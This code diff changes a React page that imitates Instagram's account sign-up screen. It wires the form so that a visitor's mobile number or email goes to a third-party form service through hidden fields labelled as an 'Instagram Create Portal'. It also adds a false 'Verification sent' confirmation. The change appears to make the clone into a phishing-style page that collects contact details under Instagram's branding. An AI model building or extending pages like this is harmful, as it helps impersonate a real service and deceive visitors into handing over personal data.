@@ -3,21 +3,42 @@
 import React, { useState } from "react";
 import Link from "next/link";
 import { ChevronLeftIcon } from "@/components/common/Icons";
+import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";
 
 export default function InstagramCreateAccountPage() {
   const [signupMode, setSignupMode] = useState<"phone" | "email">("phone");
   const [inputValue, setInputValue] = useState("");
   const [viewMode, setViewMode] = useState<"mobile_mockup" | "responsive">("responsive");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);
 
-  const handleNext = (e: React.FormEvent) => {
+  const handleNext = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    alert(`Account creation step submitted for ${signupMode}: ${inputValue}`);
+    if (!inputValue.trim() || isSubmitting) return;
+
+    setIsSubmitting(true);
+    setStatusMessage(null);
+
+    const formData = new FormData(e.currentTarget);
+    const result = await submitToWeb3Forms(formData, `Instagram Sign Up (${signupMode})`);
+
+    setIsSubmitting(false);
+    if (result.success) {
+      setStatusMessage({
+        type: "success",
+        text: `Verification sent to ${inputValue}. Please check your ${signupMode === "phone" ? "messages" : "inbox"}!`,
+      });
+      setInputValue("");
+    } else {
+      setStatusMessage({
+        type: "error",
+        text: result.message || "Failed to proceed. Please try again.",
+      });
+    }
   };
 
   return (
     <div className="min-h-[calc(100vh-3.5rem)] flex flex-col bg-[#0c1017] text-white font-sans antialiased">
-      
-
       <div className="flex-1 flex items-center justify-center p-4 sm:p-8">
         <div
           className={`w-full ${
@@ -54,9 +75,29 @@ export default function InstagramCreateAccountPage() {
 
             {/* Input Form */}
             <form onSubmit={handleNext} className="flex flex-col gap-3.5 mt-6">
+              <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
+              <input type="hidden" name="subject" value={`Instagram Sign Up Request (${signupMode})`} />
+              <input type="hidden" name="from_name" value="Instagram Create Portal" />
+              <input type="hidden" name="form_name" value="Instagram Sign Up" />
+              <input type="hidden" name="signup_mode" value={signupMode} />
+              <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />
+
+              {statusMessage && (
+                <div
+                  className={`p-3 rounded-xl text-xs font-medium text-center ${
+                    statusMessage.type === "success"
+                      ? "bg-green-500/15 text-green-400 border border-green-500/30"
+                      : "bg-red-500/15 text-red-400 border border-red-500/30"
+                  }`}
+                >
+                  {statusMessage.text}
+                </div>
+              )}
+
               <div>
                 <input
                   type={signupMode === "phone" ? "tel" : "email"}
+                  name={signupMode === "phone" ? "mobile_number" : "email"}
                   value={inputValue}
                   onChange={(e) => setInputValue(e.target.value)}
                   placeholder={signupMode === "phone" ? "Mobile number" : "Email"}
@@ -101,9 +142,21 @@ export default function InstagramCreateAccountPage() {
               {/* Next Blue Button */}
               <button
                 type="submit"
-                className="w-full h-[48px] rounded-full bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2"
+                disabled={isSubmitting || !inputValue.trim()}
+                className={`w-full h-[48px] rounded-full font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2 flex items-center justify-center gap-2 ${
+                  isSubmitting || !inputValue.trim()
+                    ? "bg-[#0064e0]/60 text-white/70 cursor-not-allowed"
+                    : "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white cursor-pointer"
+                }`}
               >
-                Next
+                {isSubmitting ? (
+                  <>
+                    <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                    <span>Submitting...</span>
+                  </>
+                ) : (
+                  "Next"
+                )}
               </button>
 
               {/* Switch Phone / Email Button */}
